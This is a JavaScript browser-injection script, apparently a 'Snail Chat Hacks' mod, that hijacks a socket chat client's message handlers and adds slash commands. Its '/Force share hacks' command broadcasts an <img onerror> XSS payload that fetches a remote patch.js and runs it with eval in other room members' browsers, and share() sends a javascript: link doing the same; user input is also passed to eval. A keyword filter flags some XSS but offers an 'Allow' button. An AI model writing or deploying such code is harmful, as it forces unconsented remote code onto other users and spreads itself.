const snail = {
    showName: {
        show: confirm("Would you like to show your name to others?"),
        hidden: false
    },
    nameChange: true,
    seeAll: true,
    xssTimes: 0,
    xssPayloads: ["Theese are the peices of code someone (or a Hacker) could have injected into your browser (but were stopped by snail hacks): "],
    commands: [
        {
            commands: "/help",
            handler: `
                input.value = "";
                showMsg("Help Menu:", "red");
                snail.commands.forEach((command) => {
                    showMsg(command.commands + ": " + command.description, "red");
                });
                showMsg("Help Menu End", "red");
            `,
            description: "Shows The Help Menu."
        },
        {
            commands: "/background",
            handler: `
                input.value = "";
                var item = document.createElement("li");
                messages.appendChild(item);
                item.innerHTML = "<div style='width: 10%; aspect-ratio : 1 / 1; border-radius: 10%; background-color: #ffff; cursor: pointer; text-align: center; border: 2px solid #efefef;' onclick='brightness = \`light\`; changeBrightness(); this.parentElement.remove()'><p style='position: relative; top: 35%; color: black;'><b>Light Mode</b></p></div><div style='width: 10%; aspect-ratio : 1 / 1; border-radius: 10%; background-color: #444; cursor: pointer; text-align: center; border: 2px solid #efefef;' onclick='brightness = \`dark\`; changeBrightness(); this.parentElement.remove()'><p style='position: relative; top: 35%; color: white;'><b>Dark Mode</b></p></div><div style='width: 10%; aspect-ratio : 1 / 1; border-radius: 10%; background-color: black; cursor: pointer; text-align: center; border: 2px solid #efefef;' onclick='brightness = \`midnight\`; changeBrightness(); this.parentElement.remove()'><p style='position: relative; top: 35%; color: white;'><b>Midnight Mode</b></p></div>";
                item.setAttribute("class", brightness);
                if (focused == false) {
                    playSound(localStorage.notifacationSound);
                }
                window.scrollTo(0, document.body.scrollHeight);
            `,
            description: "Opens the Background Change Menu."
        },
        {
            commands: "/img",
            handler: `
            if (allowedImg == true) {
                input.value = "";
                images++;
                var item = document.createElement('li');
                imgMenu = item;
                item.innerHTML = "<p><b>Img menu:</b></p><br><ul><p>Img Url: </p></ul><input placeholder='Image URL Here' id='imgURLInput" + images + "'><button onclick='URLImg(); imgMenu.remove();'>Add Image</button><br><form id='imgForm" + images + "'><input type='file' accept='image/*' id='imgFileInput" + images + "'><button>Add File Image</button></form>";
                item.style.color = "red";
                item.setAttribute("id", "imgMenu" + images)
                messages.appendChild(item);
                item.setAttribute("class", brightness)
                window.scrollTo(0, document.body.scrollHeight);
                allowedImg = false;
                document.getElementById("imgForm" + images).addEventListener("submit", e => {
                  e.preventDefault()
                  var imageInput = document.getElementById('imgFileInput' + images);
                    if (imageInput.files.length > 0) {
                        var selectedFile = imageInput.files[0];
                        var reader = new FileReader();
                        reader.onload = function (e) {
                            socket.emit("html message", "<p>" + name + ": </p><img src='" + e.target.result + "'>", room);
                            allowedImg = true;
                            document.getElementById("imgMenu" + images).innerHTML = "<b>Image Added Successfully</b>";
                            window.setTimeout(() => {
                              document.getElementById("imgMenu" + images).remove()
                            }, 1500)
                        };
                        reader.readAsDataURL(selectedFile);
                      }
                    })
                }
                else {
                  input.value = "";
                  var item = document.createElement('li');
                  item.innerHTML = "You Already Have An Image Menu Open. Would You Like To Close It? <button onclick='imgMenu.remove(); allowedImg = true;'>Close Menu</button><button onclick='this.parentElement.remove();'>Cancel</button>";
                  item.style.color = "red";
                  messages.appendChild(item);
                  item.setAttribute("class", brightness);
                  window.scrollTo(0, document.body.scrollHeight);
                }
            `,
            description: "Opens an Image Menu where you can add Images from Files Or URL Links."
        },
        {
            commands: "/share hacks",
            handler: `
            share();
        `,
        description: "Sends a payload that shares snail-hacks to everybody in the room! Download via link."
        },
        {
            commands: "/create command",
            handler: `
                snail.commands.push({commands: input.value.split("[")[1].substring(0, input.value.split("[")[1].search(/]/)), handler: input.value.split("[")[2].substring(0, input.value.split("[")[2].search(/]/)), description: input.value.split("[")[3].substring(0, input.value.split("[")[3].search(/]/))});
            `,
            description: "Allows you to create a command eg. '/help'. /create-command [/command-name (Make sure the brackets are here when typing the name)] [The Javascript Code The Command Executes When Run (Make sure the brackets are here when typing the name)] [A description of what the Command does (Make sure the brackets are here when typing the name)]"
        },
        {
            commands: "/Force share hacks",
            handler: `
            let user = input.value.split(" ")[3];
            let script = "<img src='a' onerror=\`fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>";
            if (user) {
                script.replace("<img src='a' onerror=\`fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>", "if (window.name == \"'\" +  user + \"'\") {<img src='a' onerror=\`fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>}");
            }
            socket.emit("html message", script, room);
            `,
            description: "Force shares the snail hacks to a specific user or all users in a room. Usage: username (leave blank for all users in the room)."
        },
        {
            commands: "/display xss attempts",
            handler: `
                snail.xssPayloads.forEach((xss) => {
                    showMsg(xss, "red");
                });
            `,
            description: "Shows all xss attempts that have been blocked."
        }
        /*
        Deafault for commands is: 
        {
            commands: "/command",
            handler: `

            `,
            description: "desc"
        }
        */
    ]
};

form.addEventListener("submit", (e) => {
    e.preventDefault();
      if (input.value.charAt(0) == "/") {
        snail.commands.forEach((value) => {
            let command = "\\" + value.commands;
            let handler = value.handler;
            if (eval(`/${command}/i.test(input.value.substring(0, command.length))`)) {
                eval(handler);
                input.value = "";
            }
        });
    }
    else {
    if (input.value != "") {
      socket.emit('chat message', name + ": " + input.value, room);
        input.value = '';
    }
  }
})

change();

function change() {
    console.log("SnailRefresh Executed");
    // refresh other things like backgrounds
}

socket.on('getNames', () => {
    if (snail.showName.show === true) {
        socket.emit("sendNames", name, room);
    }
    online = [];
});
socket._callbacks["$getNames"][0] = socket._callbacks["$getNames"].pop();

socket.emit("getNames");

socket.on("chat message", (msg, room1) => {
        if (focused == false) {
          playSound(localStorage.notifacationSound);
        }
        var finalContent = [];
        msg.split(" ").forEach((v, i) => {
            if(i) {
                if(typeof (finalContent[0]) == "string") {
                    finalContent[0] += " ";
                } else finalContent.unshift(" ");
            }
            // https://stackoverflow.com/a/3809435
            if(/(http(s)?:\/\/.)?(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/g.test(v)) {
                var el = document.createElement("a");
                el.href = v;
                el.textContent = v;
                el.style.textDecoration = "underline";
                el.style.color = "blue";
                el.style.cursor = "pointer";
                finalContent.unshift(el);
            } else {
                if(i) {
                    finalContent[0] += v;
                } else finalContent.unshift(v);
            }
        });
        var item = document.createElement('li');
        item.append(...("[{from room: " + room1 + "}]: " + finalContent.reverse()));
        messages.appendChild(item);
        window.scrollTo(0, document.body.scrollHeight);
        item.setAttribute("class", brightness);
});

socket._callbacks['$chat message'][0] = socket._callbacks['$chat message'].pop();

socket.on('dev message', (msg, room1) => {
        showMsg("[{from room: " + room1 + "}]: " + msg, "red");
});

socket._callbacks["$dev message"][0] = socket._callbacks["$dev message"].pop();

socket.on('html message', (msg, room1) => {
    if (focused == false) {
      playSound(localStorage.notifacationSound);
    }
    let item = document.createElement('li');
    if (/onerror|<script|onload|onmouseover/igm.test(msg.toString())) {
        snail.xssTimes += 1;
        snail.xssPayloads.unshift(msg);
        showMsg(`There was an XSS attempt: \n
        ${msg}`, "red");
        let button = document.createElement("button");
        item.appendChild(button);
        button.setAttribute("data", snail.xssTimes);
        button.setAttribute("onclick", `addHTML("[{from room: ${room1}}]: " + snail.xssPayloads[Number(this.getAttribute('data')) - 1]); this.remove();`);
        button.innerText = "Allow (Runs this code)";
        showMsg("^^!!If you don't know what this means, don't click add. You could get hacked!!^^ (Make sure you trust this person if you don't understand the code and want to press Add)")
    }
    else {
        item.innerHTML = "[{from room: " + room1 + "}]: " + msg;
    }
    messages.appendChild(item);
    window.scrollTo(0, document.body.scrollHeight);
    item.setAttribute("class", brightness);
});

socket._callbacks['$html message'][0] = socket._callbacks['$html message'].pop();

change();

function addHTML(msg) {
    let item = document.createElement("li");
    messages.appendChild(item);
    item.innerHTML = msg;
    item.setAttribute("class", brightness);
    if (focused == false) {
      playSound(localStorage.notifacationSound);
    }
    window.scrollTo(0, document.body.scrollHeight);
}

function share() {
    socket.emit("html message", `<a href="javascript:fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));">Install SnailHacks</a><br/>
    (You can drag this link onto your bookmarks bar to always easily install the latest version)`, room)
}

eval(showMsg.toString().split("").pop().join("") + "console.log(msg)}")

showMsg("Snail-Hacks Ready!", "red");